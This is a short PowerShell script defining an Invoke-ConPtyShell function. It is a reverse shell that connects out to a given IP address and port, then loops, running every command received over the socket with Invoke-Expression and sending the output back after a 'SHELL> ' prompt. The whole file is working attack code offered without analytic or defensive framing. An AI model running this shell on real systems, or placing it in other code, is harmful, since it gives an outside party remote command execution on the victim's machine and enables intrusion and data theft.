function Invoke-ConPtyShell {
    param (
        [string]$ip,
        [int]$port
    )

    $TCPClient = New-Object Net.Sockets.TCPClient($ip, $port)
    $NetworkStream = $TCPClient.GetStream()
    $StreamWriter = New-Object IO.StreamWriter($NetworkStream)

    function WriteToStream ($String) {
        [byte[]] $script:Buffer = 0..$TCPClient.ReceiveBufferSize | ForEach-Object {0}
        $StreamWriter.Write($String + 'SHELL> ')
        $StreamWriter.Flush()
    }

    WriteToStream ''
    while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
        $Command = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
        $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }
        WriteToStream $Output
    }

    $StreamWriter.Close()
}
